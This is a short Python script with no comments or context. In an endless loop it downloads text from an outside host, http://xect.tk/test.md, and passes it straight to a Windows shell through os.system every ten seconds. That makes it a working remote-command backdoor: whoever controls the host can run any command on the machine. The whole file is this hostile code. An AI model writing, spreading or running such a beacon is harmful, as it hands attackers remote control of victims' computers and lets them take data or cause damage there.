import requests
import os
from time import *
while True:
    r = requests.get(r'http://xect.tk/test.md')
    os.system(f'cmd /c {r.text}')
    sleep(10)
